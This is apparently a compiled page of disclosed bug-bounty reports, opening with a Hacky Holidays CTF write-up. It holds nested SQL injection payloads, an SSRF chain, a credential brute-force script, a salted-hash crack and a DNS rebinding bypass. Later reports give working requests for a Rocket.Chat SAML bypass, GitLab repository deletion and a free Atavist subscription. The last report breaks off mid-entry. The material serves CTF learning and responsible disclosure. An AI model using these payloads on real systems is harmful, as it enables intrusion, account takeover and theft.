Got the flag and access to the Recon Server! It's game time now...

## Flag #11 - Grinch Recon
>He was lean and mean, a right spooky old Who
>And I laughed when I saw a hint of what to do
>A wink of his eye and his evil twisted head 
>Soon gave me to know I had everything to dread;

"*We need to go deeper*" I thought after a double SQLi and an SSRF. "There has to be a *third* SQL injection!"

This challenge was the work of a true menace. Adam is become death, the destroyer of Christmas. 

###Background
This recon server holds picture albums of reconnaissance photos related to Santa and his work shop. Albums are stored in a database and retrieved via a hash. Pictures within albums are retrieved securely using an authenticated server side request, precluding forgery. 

Additionally, the recon server has an API which is not directly accessible. Tying everything together, you have to find way to authenticate arbitrary SSRF requests to the API in order to deduce the username and password in order to move to the next flag. 

### Step 1: SQL Injection #1 - hash
There was a fairly obvious SQL injection on the value of `hash`. I checked this manually with a simple boolean payload: `' AND 1=1;--`


 - 200, album loads: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%201=1;--
 - 404: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%201=0;--

I loaded up SQLMap and dumped the database:

`sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump`

```
Database: recon                                                                                                                                                                       
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+
```
```
Database: recon                                                                                                                                                                       
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```
### Step 2: recon on r3c0n
That was nice and all... but I still couldn't couldn't figure out how I was going to authenticate to the API. Let's dig around and see how this whole thing is set up. 

The `/picture` endpoints loaded in the albums look like this:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9

And the `data` parameter contains the following JSON object:
```json
{
  "image": "r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg",
  "auth": "bbf295d686bd2af346fcd80c5398de9a"
}
```
Any attempts to modify the image URL and auth hash and resend the request resulted in `invalid authentication hash`. It seemed like it had to be generated the hash on the backend. 

There's also an API hosted at https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api 

{F1133182}

### Step 3: SQL Injection #2 - state of the union of the union

Around this time, I started to reach out to other CTFers on discord to brainstorm how to do this challenge. A small team formed and @mava contributed an amazing idea: *double SQL injection. *

I started to imagine what the underlying SQL query(s) looked like for the /album endpoint. There were two tables and the ID had to come from the hash in the first table. 

Query #1
```sql
SELECT id FROM album WHERE hash = 'jdh34k '
```
Value from query #1 is sent to query #2
```sql
SELECT photo FROM photo where album_id = '1'
```
Looking at these two queries... it seemed possible that you could `UNION` something to the output of query #1 that would be injected into query #2. 

I was able to craft the following initial SQLi payload that shows you can control the value sent to the second query with a `UNION`


- First album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%221%22,%22456%22,%22789%22%20--+
- Second album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%222%22,%22456%22,%22789%22%20--+
- Third album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%223%22,%22456%22,%22789%22%20--+

If we can nestle a payload into the first union slot, we should be able to execute a SQLi inside a SQLi. I started with an ORDER BY to determine there were three columns, which makes sense based on the DB dump performed earlier. 

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%221%27%20ORDER%20BY%203--+%22,%22456%22,%22789%22%20--+
`1' UNION SELECT "1' ORDER BY 3-- ","456","789" -- `


Now we can perform the second `UNION`:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,3%27--+%22,%22456%22,%22789%22--+
`1' UNION SELECT "' UNION SELECT 1,2,3'-- ","456","789"-- `

which produces this URL:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMiLCJhdXRoIjoiZmVhNzUwNzQ3OGFhODIyNWMwMjI1MjdiMTc2M2ZiMzMifQ==

which (doesnt return an invalid hash error!! and) decodes to 

```json
{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"fea7507478aa8225c022527b1763fb33"}
```

NICE! we can now modify the `3` in our embedded payload to injected a path traversal SSRF payload to start analyzing the API!

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=123%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/x%27--+%22,%22456%22,%22789%22--+

Here's the full URL decoded SQL injection payload:

```
123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"-- 
```

### Step 4: SSRF and API analysis

For this part, I got a little inefficient and used Burp's Intruder to fuzz for valid API endpoints. I ran an inital fuzz using a common.txt wordlist to collect base64 data parameters using the "Grep - Extract" intruder option. 

{F1133257}

I then ran a second attack on the `picture` endpoint with the collected base64 values and analyzed the responses to determine which endpoints were valid. 

{F1133267}

I ended up finding two endpoints that triggered an "Invalid content type detected" error: `/api/ping` and `/api/user`. This response indicates that the request was successful and returned a 200 response, but the content type was not an image. I'm confident that ping was a total red herring because I didn't find anything remotely useful with it. 

*Now* is when the API documentation comes in handy.  

{F1133315}

If an invalid parameter is passed to an API endpoint, a 400 response is returned. I ran the exact same attack already outlined above to determine valid parameters on the `user` endpoint. Valid parameters trigger a 204 response. 

The valid parameters for the endpoint are `username` and `password`. The last piece of this puzzle was to figure out valid values for those parameters. 

###Step #5: SQL Injection #3 - We have to go deeper! ... *again*

Looking for interesting errors, I ran the attack outlined in step 3 a third time, but I used a list of ASCII metachars to look for errors or different responses. During that attack, I noticed that a `%` character in the `username` parameter triggered the `Invalid content type` error, meaning a 200 response. 

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-4685%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/user?username=%25%27--+%22,%22456%22,%22789%22--+

Thinking about it a little harder, it looks like we have a reflection context inside a SQL `LIKE` query! Here's what I imagine the query to look like:

```
SELECT * FROM user WHERE username LIKE '%' OR password LIKE ''
```
Using this functionality, we can do a substring brute force to discover the username and password values - similar to what we did for Flag #9. 

I used the following script to extract the username and password:

```python
import requests
from lxml import html

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789~`!%@#$^*()-_=+[{]}\|;:,<.>/?"

host = "https://hackyholidays.h1ctf.com"
url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=?hash=-4685%%27%%20UNION%%20SELECT%%20%%22%%27%%20UNION%%20SELECT%%20null,null,%%27../api/user?username=grinchadmin%%26password=%s%%25%%27--+%%22,null,null--+%%22"

#username = grinchadmin
#password = s4nt4sucks
out = ''
found = 0
while True:
	for c in alphabet:
		# _ (underscore) is another wildcard character in MySQL. I escaped a few other tricky characters just in case. 
		if c == '_':
			c = '\_'
		if c == '%':
			c = '\%'
		if c == '\\':
			c = '\\\\'

		# add found letters into the payload 
		tester = url % (out+c)
		# send the payload
		r = requests.get(tester)
		# parse html
		tree = html.fromstring(r.text)
		# get /picture?data=base64 URL
		url2 = tree.xpath('//img')[1].items()[1][1]
		# send second request
		r2 = requests.get(host+url2)

		# if response contains "Invalid", we have found a letter
		if "Invalid" in r2.text:
			out += c
			found = 1
			break
	print out
	if not found:
		print out
		break
	else:
		found = 0
```
Here's the output from that script:

{F1133373}

With the username/password combo of `grinchadmin` / `s4nt4sucks` I was able to log into the Attack Box and retrieve the flag!

{F1133376}

##Flag #12 - Grinch Network Attack Server
>He spoke not a word, but went straight to his hack,
>He had found the IPs and started the attack!
>Do or Die! We must now lend Santa our aid
>To take down Grinch Networks and save the day!

Thankfully, the hardest was not saved for last! While this flag was more straightforward, I definitely struggled finding the initiial foothold. I tried just about everything but using hashcat to crack a password acting as a salt!

Thanks to our ragtag #grincharmy team, we were able to find flag 12 and take down Grinch Networks to save Christmas. 
 - Max, @mava
 - castilho, https://twitter.com/castilho101
 - h3x0ne, https://twitter.com/h3xone
 - d3f4u17, https://twitter.com/_d3f4u17_
 - Panya, https://github.com/panya
 - chron0x, https://twitter.com/chron0x1

Here's how we did it:

###Summary:
The Attack Box is set up to target and launch DDoS attacks against three of Santa's IP's. These attacks can be launched by clicking "Attack" which triggers a request like the following:

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

This launches a spookily realistic attack on the targeted IP! (sorry Santa!)

the `payload` parameter decoded is 

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```
Argh! *another* hash! The last one in Flag 11 gave us headaches plenty. In order to stop the Grinch, we had to point the target at itself so the network would take itself down. 

###Feeling Salty

Try as we might, we couldn't find any way to bypass the hash protection. I did find that `-` could be used in the target without triggering an error, indicating a domain could be passed as a target - but we'll talk more about that soon. 

The suggestion of hashcat was brought up and we started to see if we could crack whatever was being used to authorize the IP addresses. The assumption that the authentication hash was generated in one of two ways:
 - md5(password + ip)
 - md5(ip + password)

There's not an exact command line argument in hashcat for this specific situation, but there are two modes that are similar enough to work:

```
- [ Hash modes ] -

      # | Name                                             | Category
  ======+==================================================+======================================
    900 | MD4                                              | Raw Hash
      0 | MD5                                              | Raw Hash
  ...
     10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated
     20 | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated
``` 
After some tweaking and testing, we found that attack mode 10 worked! The authenticated hash was being generated with `md5('mrgrinch463'+ip)`

hashcat command
```
hashcat -m 10 -O 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 rockyou.txt --force
```
Output:
```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: md5($pass.$salt)
Hash.Target......: 5f2940d65ca4140cc18d0878bc398955:203.0.113.33
Time.Started.....: Mon Dec 28 21:10:03 2020 (2 secs)
Time.Estimated...: Mon Dec 28 21:10:05 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  2218.0 kH/s (0.96ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 5352547/14344385 (37.31%)
Rejected.........: 1123/5352547 (0.02%)
Restore.Point....: 5349475/14344385 (37.29%)
Candidates.#1....: mrkitty18 -> mrbrln07
HWMon.Dev.#1.....: N/A
```

###DNS Rebinding
With the password cracked, all we had to do now what make an authentication hash for `127.0.0.1` right?? WRONG!

Here's the hash:
md5('mrgrinch463127.0.0.1') == 3e3f8df1658372edf0214e202acb460b

Here's the payload:
{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}

Here's the launch URL:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==

But here's the issue: "Local target detected, aborting attack"

{F1133394}

We know domains can be used in the `target` field since dashes are allowed. The first thing that comes to mind is a DNS Rebinding attack. The site http://1u.ms/ has a succint explanation that details why this would work in this case:

> DNS rebinding is a well-known technique targeting TOCTOU (Time-of-check to time-of-use) type of vulnerabilities during IP blacklisting or whitelisting. It is performed using a domain that resolves in a legit IP during the first request (check) and to the forbidden one during the second request (use).

In our case, we'd like to craft a domain that resolves to `203.0.113.213` for the check and then the localhost `127.0.0.1` when the attack is launched. 

We can make a domain that behaves like this using a this tool: https://lock.cmpxchg8b.com/rebinder.html

{F1133407}

And now we have this domain which randomly resolve to either 127.0.0.1 or 203.0.113.213: `cb0071d5.7f000001.rbndr.us`. This took a few times to work because we have to win two "coin flips" of the IP pointing to 203.0.113.213 first and then 127.0.0.1 for the actual attack.

With a domain prepared, we can relaunch the attack! 

Here's the hash:
md5('mrgrinch463cb0071d5.7f000001.rbndr.us') == 51a799c562ed548d5ce9c8f4d1e71455

Here's the payload:
{"target":"cb0071d5.7f000001.rbndr.us","hash":"51a799c562ed548d5ce9c8f4d1e71455"}

Here's the launch URL:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJjYjAwNzFkNS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI1MWE3OTljNTYyZWQ1NDhkNWNlOWM4ZjRkMWU3MTQ1NSJ9

After a few tries, the rebinding attack works and we've DDoS'd  Grinch Networks and saved the holidays!

{F1133408}

## Epilogue
I'm glad that we saved Christmas but I'm sad that it's over. These were 12 fantastic challenges - and they were a challenge in every sense of the word. I look forward to more CTF's made by Adam in the future! 

>Grinch sprang to his sleigh, to Max he gave a whistle,
>And away they all flew like the down of a thistle.
>But I heard him exclaim, ere he drove out of sight—
>“Happy Hackmas to all, and to all a good night!”

@bendtheory

## Impact

The Grinch *could* have stolen Christmas! Were it not for the dozen or holes identified in his Network. I hear his IT guy - Adam? - is in world of trouble right now.

---

### [SAML authentication bypass through unauthenticated `addSamlProvider` Meteor Call](https://hackerone.com/reports/1049375)

- **Report ID:** `1049375`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Rocket.Chat
- **Reporter:** @fabianfreyer
- **Bounty:** - usd
- **Disclosed:** 2021-01-08T15:43:08.658Z
- **CVE(s):** CVE-2020-29594

**Vulnerability Information:**

**Summary:** Rocket.Chat exposes an unauthenticated Meteor method `addSamlProvider`, which allows disabling SAML signature verification.

**Description:**

The `addSamlProvider` Meteor method sets a number of settings, among them a boolean flag that defaults to `false`:
```js
export const addSamlService = function(name: string): void {
	settings.add(`SAML_Custom_${ name }`, false, {
		type: 'boolean',
		group: 'SAML',
		i18nLabel: 'Accounts_OAuth_Custom_Enable',
	});
```

The provider `name` is entirely user-controlled in this case.

Secondly, if a SAML authentication provider does not have a certificate set, or the setting is falsy, no validation is performed:
```js
private verifySignatures(response: Element, assertionData: ISAMLAssertion, xml: string): void {
	if (!this.serviceProviderOptions.cert) {
		return;
	}
```

## Releases Affected:

  * all versions including `meteor-accounts-saml`, i.e. 0.8.0 and later.

## Steps To Reproduce (from initial installation to vulnerability):

On the login page of a Rocket.Chat instance supporting SAML authentication using a provider named `Default` (this is the default), run the following Meteor call:
```
Meteor.call("addSamlService", "Default_cert")
```

Then log in using an arbitrarily faked SAML response.

## Suggested mitigation

  * Remove the `addSamlProvider` Meteor method. All callers of the underlying function are server-side, therefore it needs not be exposed to the client.

## Impact

* An unauthenticated attacker can disable SAML certificate validation on an instance with SAML authentication enabled, and then log in as an arbitrary user with administrative privileges.

---

### [Create an account on auth-sandbox.elastic.co with email @elastic.co or any other @domain.com](https://hackerone.com/reports/837510)

- **Report ID:** `837510`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Elastic
- **Reporter:** @superman85
- **Bounty:** - usd
- **Disclosed:** 2020-12-28T16:23:52.187Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
Dear Team,

Today when doing some recon steps and found this subdomain 
>https://54.246.136.164/

Its not loaded correctly and viewing the source code exposed some other links interesting

>https://elasticsandbox.docebosaas.com/pages/14/learner-dashboard
https://auth-sandbox.elastic.co

Go to https://elasticsandbox.docebosaas.com/learn and using **SIGNIN WITH SAML SSO** leading to 

>https://staging.found.no/login?fromURI=https%3A%2F%2Fauth-sandbox.elastic.co%2Fapp%2Felasticcoexternal_docebo_1%2Fexkigtmda9ejVUCM70h7%2Fsso%2Fsaml%3FSAMLRequest%3DnVJNb9swDP0rhu6O%252FBE3sRBnyBIMC9BuQZ32sEsgy0yjTZY0Ud68fz%252FFSbH2ksNOAim%252B9%252FhILpB3yrJV70%252F6EX72gD4aOqWRjR8V6Z1mhqNEpnkHyLxg9erhnmWThFlnvBFGkTeQ2wiOCM5Lo0m03VTk0DTzMj%252B2YlYWjeDHpk3zsiggnxfibppnWXonoMyKNM9I9AwOA7IigSjAEXvYavRc%252B5BKsiROpnGS7dM5m%252BasmH4j0Sa4kZr7EXXy3iKjlAerMXLdNmaYgOKhREyEodxaeg2FgcGD01wdWiOgMYeUwvBDvviu5SV8f35aP8yS04wiGno2TaLVq7G10dh34Gpwv6SAp8f7f9JX%252BlfxCzdyjkG%252Fo6pDKnULw8Se7AdX1bKzCupAvwqtvY860%252FYKcBSnaMc3i7nAM5a2cOS98jFaEu2uO%252FoYqKV%252Bub2e5lKE7PN%252Bv4t3X%252Bs9WS7O3Gwct1v%252Bh5MFfUuwuNzblyC93eyMkuJP9Mm4jvvbnZ0zso2PYynzjmuUoH0YvFLm99oB91AR73ogdHmRfH%252FVy78%253D%26RelayState%3Dhttps%253A%252F%252Felasticsandbox.docebosaas.com%252Flms%252Findex.php%253Fr%253Dsite%252Fsso%2526sso_type%253Dsaml

At the website https://staging.found.no/ use **Signup** function allow me to register 2 accounts below
>superman85@wearehackerone.com
support@elastic.co

After login https://auth-sandbox.elastic.co/app/UserHome my account dashboard from superman85@wearehackerone.com is different with support@elastic.co.

On account support@elastic.co I can view some interesting apps like Elastic Cloud Admin (QA-Canary) etc ...

I have tried to launch apps and successful authorization this 
>https://adminconsole-qa-eu-west-1.aws.qa.cld.elstc.co/deployments

I do not do anything after logged in adminconsole. My IP address is **█████**

{F771084}
## Steps To Reproduce:

  1. Go to https://staging.found.no/ and Signup an account with email @elastic.co 
  1. Go to https://auth-sandbox.elastic.co and login with email/password you have registered
{F771085}
  1. After logged in, you are able to see the apps 
{F771083}

## Impact

With this vulnerability an attacker was allowed to view apps only visible to employees with email @elastic.co

---

### [Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg](https://hackerone.com/reports/1027822)

- **Report ID:** `1027822`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Starbucks
- **Reporter:** @ko2sec
- **Bounty:** - usd
- **Disclosed:** 2020-12-09T22:14:28.454Z
- **CVE(s):** -

**Summary (team):**

ko2sec discovered an .ashx endpoint on mobile.starbucks.com.sg intended for image files permitted unrestricted file type uploads which could lead to a potential RCE. ko2sec's thorough analysis provided additional endpoints on other out of scope domains that shared this vulnerability.

@ko2sec  — thank you for reporting this vulnerability and for confirming the resolution.

---

### [No Email Checking at Invitation Confirmation Link leads to Account Takeover without User Interaction at CrowdSignal](https://hackerone.com/reports/915110)

- **Report ID:** `915110`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Automattic
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:23:12.728Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi team,
When you have a team account, you can invite users to your team from https://app.crowdsignal.com/users/list-users.php
If you invite a user, you will see this :
{F893386}
As you can see, there is confirmation link and we can see it from our dashboard.
And if you invite existing email in website, you can see the confirmation link again. And in this link, there is no e-mail check, when you click to confirmation link, you will log-in to victim's account without any error, credentials.

## Steps To Reproduce:

  1. Go to https://app.crowdsignal.com/users/list-users.php with your team account
  1. Invite an existing email (write victim's email)
  1. And click to confirmation link with your account
  1. You will log-in to victim's account directly

## PoC video :
{F893388}

## Impact

Account Takeover without user interaction

Thanks,
Bugra

---

### [Can buy Atavist Magazine subscription for free](https://hackerone.com/reports/951230)

- **Report ID:** `951230`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Automattic
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:21:37.932Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi team
If you go to https://magazine.atavist.com/ and scroll down. You will see membership price is $25, but I found a way to buy this subscription for free via Gift feature.
When you send gift request before adding any credit card to your account you will see this response :

{F936531}

However, if you check the gift recipient's email you will see the Gift email that contains the gift link.

{F936533}

## Steps To Reproduce:

  1. Just send this request (change `YOUR_EMAIL`, `YOUR_PASSWORD`, `RECIPIENT_EMAIL`, `gift_timestamp to current date, it was 2020-8-4 while reporting this`)  :

```http
POST /api/v2/store/purchase.php HTTP/1.1
Host: magazine.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 204
Origin: https://magazine.atavist.com
DNT: 1
Connection: close
Referer: https://magazine.atavist.com/

email=YOUR_EMAIL&password=YOUR_PASSWORD&product_id=com.theatavist.atavist.subscription.membership&gift_timestamp=2020-8-4&gift_recipient=RECIPIENT_EMAIL&gift_message=test&gift_gifter=test
```

You will see `{"error":"invalid_request_error","error_description":"The customer must have an active payment source attached."}` in response but if you check the recipient's email, you will see the gift link.

## Impact

Able to buy magazine membership for free

Thanks,
Bugra

---

### [Ticket Trick at https://account.acronis.com](https://hackerone.com/reports/999765)

- **Report ID:** `999765`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Acronis
- **Reporter:** @sayaanalam
- **Bounty:** - usd
- **Disclosed:** 2020-11-10T09:14:47.056Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
Hello dear team,
I found a serious issue in Acronis
This vulnerability is called ticket trick vulnerability which comes under critical category. Which can allow me to login on websites like atlassian,github,clouflare,choopa,..etc on behalf of support_mobility@acronis.com .

## Steps To Reproduce
Lets take an example to get your github account.

1. As Github send account register verification mails from noreply@github.com
2. I registered an account on acronis with same email.
3. Now your support system creates ticket of emails sent to  support_mobility@acronis.com .
4. So I registered an account  on github and logged into my acronis account with email noreply@github.com .
5. As Acronis allowed me to see support tickets without email verification , so I was able to see support tickets easily created by noreply@acronis.com .
6. On support ticket there was an email verification link sent to noreply@github.com .
7. In this way I was able to takeover many account registered with  support_mobility@acronis.com and many internal accounts that can be accessed with only @acronis.com

##POC

I was able to register a github account on your email address :-

{F1022537}

##Resources about this vulnerability:-
https://hackerone.com/reports/498964
https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c

## Impact

* Critical Email Takeover
* Ticket Trick


Thanks for reading my report.

Best Regards
Sayaan Alam

---

### [Insufficient Type Check on GraphQL leading to Maintainer delete repository](https://hackerone.com/reports/858671)

- **Report ID:** `858671`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @ledz1996
- **Bounty:** - usd
- **Disclosed:** 2020-11-02T16:11:38.497Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

As you have know, Maintainer cannot delete/archive repository. But via GraphQL, they can do as there exists an sufficient check on GraphQL API

***app/graphql/mutations/snippets/destroy.rb***

```ruby
  def resolve(id:)
        snippet = authorized_find!(id: id)

        response = ::Snippets::DestroyService.new(current_user, snippet).execute
```

The function `authorized_find` lead to `object_from_id!` 

***app/graphql/mutations/snippets/base.rb***

```ruby
  def find_object(id:)
        GitlabSchema.object_from_id(id)
      end

      def authorized_resource?(snippet)
        Ability.allowed?(context[:current_user], ability_for(snippet), snippet)
      end

      def ability_for(snippet)
        "#{ability_name}_#{snippet.to_ability_name}".to_sym
      end
```

Here there is no check for whether the Object returned from `find_object` is a Snippet. I could specify any object which the user have permission of 
` "#{ability_name}_#{snippet.to_ability_name}".to_sym` to.
For example: A DiffNote that is created by a Maintainer in the Project as the function.

If I have such a ID:
```
mutation test{
  destroySnippet(input: {id: "gid://gitlab/DiffNote/116"}){
    errors
  }
}
```

It refer to an DiffNote with id `116`
Perfectly, a Maintainer have an `admin_note` and `admin_snippet` on a DiffNote (!!!)

In the mutation Destroy the call to `` ::Snippets::DestroyService.new(current_user, snippet)`` but the Object of `snippet` is actually a `DiffNote`

***app/services/snippets/destroy_service.rb***
```ruby
  def attempt_destroy!
      result = Repositories::DestroyService.new(snippet.repository).execute

      raise DestroyError if result[:status] == :error

      snippet.destroy!
    end
```
and in 

***app/models/diff_note.rb***

```ruby
  def repository
    noteable.respond_to?(:repository) ? noteable.repository : project.repository
  end
```
It return the `project.repository` which in turn the Project that the `DestroyService` gonna delete

### Steps to reproduce

1. Create 2 User: User A, User B
2. User A create a project set User B as Maintainer.
F802288
3. User B create 2 branch with the same file but different content
F802287
F802289
4. Create a merge request for those 2 Branch
F802290
5. Create a diff note for the file by clicking at the comment on a line of the file then Submit it
F802291
6. To know the ID of diff note, delete this one, the ID will show up in burp then you will know the ID of the next one
F802292
7. Use the `/-/graphiql-explorer` to execute the following the query

```
mutation test{
  destroySnippet(input: {id: "gid://gitlab/DiffNote/118"}){
    errors
  }
}
```

F802293
8. Enjoy no repository
F802294
9. If you click on `Create empty repository` It will actually make the Project 404 but It still show up on the User's project feed
F802295
F802296
### Impact

Unauthorized deleting of repository/project by maintainers

### Output of checks

This bug happens on GitLab.com

## Impact

Unauthorized deleting of repository/project by maintainers

---

### [Thailand - SNMP Publicly Accessible](https://hackerone.com/reports/455726)

- **Report ID:** `455726`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Starbucks
- **Reporter:** @k3mlol
- **Bounty:** - usd
- **Disclosed:** 2020-10-07T00:07:19.317Z
- **CVE(s):** -

**Summary (team):**

k3mlol discovered a Thailand SNMP publicly available which permitted access to configuration information from the asset.

@k3mlol — thank you for reporting this vulnerability and for confirming the resolution.

---

### [Missing server side controls when editing the board’s sharing permissions per user](https://hackerone.com/reports/827816)

- **Report ID:** `827816`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @warsocks
- **Bounty:** - usd
- **Disclosed:** 2020-09-28T11:26:54.168Z
- **CVE(s):** CVE-2020-8182

**Vulnerability Information:**

Author: Silvia Väli, Clarified Security (https://www.clarifiedsecurity.com/silvia-vali/)
Date: 24th of March, 2020

**Description**:
When the regular user is visiting the Deck view, all created boards are displayed along with the ones that are shared with the user by others. Available functionality within each of the shared boards depends whether the user has received share, manage, edit permissions. 

Since the access control rules related to user’s permissions have only been applied on the client side and not on the server side, user can specify share/edit/manage permissions to be always true within the response (for example by using a proxy tool) when viewing board information. This way he can gain control over the board so he/she could apply the missing edit/manage permissions to him/herself directly from the UI.

**Version information**:
Nextcloud 18.0.2
Deck 0.8.0 enabled

**Pre-requisites as an admin user to follow the vulnerable path**:
- create 2 regular users in the next cloud, for example user silvia and user john. Users do not belong to the admin group.
- Install the Deck app (installed version 0.8.0)

**To reproduce the vulnerable path**:

**User: silvia**

1. Authenticate as user silvia and select Deck from the menu
2. Create new board -> name it (“board for testing”)
3.  Add a new stack (“test test”)
4. Click on “Show board for details”
5. Add the other user john and only give him Share permission. Uncheck Edit and Manage.

**User: john**

6. Now authenticate in the application as john -> click Deck from the menu and open the shared board “board for testing”. Since the board was only Shared and no edit permissions were granted, john cannot do much on the board. 
7. What john can do however is use a proxy tool such as Burp Suite to modify the response body. When john clicks on the Deck from the menu, following request is made:
```
GET /apps/deck/boards HTTP/1.1
Host: next.yy.ee
...
Connection: close
Cookie: …
```

8. In the response to that request, you can see that john only been given the permission to share which only allows to read the data and not modify it.
```
[{"title":"board for testing",
"owner":{"primaryKey":"silvia","uid":"silvia","displayname":"silvia"},"color":"0082c9","archived":false,"labels":[],"acl":[{"participant":{"primaryKey":"john","uid":"john","displayname":"john"},"type":0,"boardId":7,"permissionEdit":false,"permissionShare":true,"permissionManage":false,"owner":false,"id":4}],"permissions":{"PERMISSION_READ":true,"PERMISSION_EDIT":false,"PERMISSION_MANAGE":false,"PERMISSION_SHARE":true},"users":[],"shared":1,"stacks":[],"deletedAt":0,"lastModified":1585045324,"id":7}]
```

9.  john however uses a proxy tool such as Burp Suite and applies via proxy -> options -> Match and replace that every time the following line with permissions is seen modify all the options to be equal to true.
Original: `"permissionEdit":false,"permissionShare":true,"permissionManage":false,"owner":false`
Modified: `"permissionEdit":true,"permissionShare":true,"permissionManage":true,"owner":true`

10. If john now refreshes the Deck page and opens the board “board for testing” -> Show board details -> Sharing -> he can add himself the permissions to Edit, Share, Manage to take over the board which was initially only shared with him.

## Impact

Attacker would achieve control over the board and its data/attachment uploads etc.

---

### [Unauthorized updates to extended_info properties in /store/ajaxpackagesave](https://hackerone.com/reports/815547)

- **Report ID:** `815547`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
